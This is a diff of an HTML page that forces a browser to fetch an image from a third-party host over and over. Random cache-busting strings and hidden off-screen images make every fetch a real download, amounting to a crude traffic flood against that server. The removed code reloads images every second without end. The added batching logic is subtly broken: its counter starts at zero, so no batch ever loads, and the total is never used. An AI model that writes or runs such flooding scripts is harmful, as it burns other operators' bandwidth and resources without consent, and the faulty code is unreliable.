@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Heavy Image Load</title>
+  <title>Controlled Image Load</title>
   <style>
     /* Prevent images from being visible, but still force the download */
     .offscreen {
@@ -20,28 +20,47 @@
 
   <script>
     const baseUrl = 'https://one.one.one.one/media/card.png';
-    const totalImages = 10; // Number of images to load
+    const imagesPerBatch = 50; // Load 50 new images once 50 previous ones have finished
+    const totalImages = 1000; // Total number of images to load
     const container = document.createElement('div'); // Container to append images
     document.body.appendChild(container);
 
+    let loadedImages = 0; // Counter for successfully loaded images
+
+    // Function to track and load new images
     function loadImages() {
-      for (let i = 0; i < totalImages; i++) {
-        const img = new Image();
-        const cacheBuster = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
-        img.src = `${baseUrl}?cb=${cacheBuster}`; // Unique URL to bypass cache
-        img.className = 'offscreen'; // Off-screen but downloading
-        img.onload = img.onerror = () => {
-          // Optional: Do something when each image loads or fails (like logging)
-          // console.log('Image loaded:', img.src);
-        };
-        container.appendChild(img);
+      // Only load new images if 50 previous images are fully loaded
+      if (loadedImages >= imagesPerBatch) {
+        loadedImages = 0; // Reset the loaded count once we load new images
+
+        for (let i = 0; i < imagesPerBatch; i++) {
+          const img = new Image();
+          const cacheBuster = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
+          img.src = `${baseUrl}?cb=${cacheBuster}`; // Unique URL to bypass cache
+          img.className = 'offscreen'; // Off-screen but downloading
+
+          img.onload = () => {
+            loadedImages++;
+            // Optional: You can log successful image load for debugging purposes
+            // console.log('Image loaded:', img.src);
+
+            // If 50 images have been loaded, trigger the next batch load
+            if (loadedImages === imagesPerBatch) {
+              setTimeout(loadImages, 1000); // Start loading the next 50 images
+            }
+          };
+
+          img.onerror = () => {
+            loadedImages++; // Still count it to avoid infinite loop
+          };
+
+          container.appendChild(img);
+        }
       }
     }
 
-    loadImages(); // Start loading images
+    loadImages(); // Start loading images once
 
-    // Keep reloading the images every 3 seconds
-    setInterval(loadImages, 1000);
   </script>
 </body>
 </html>
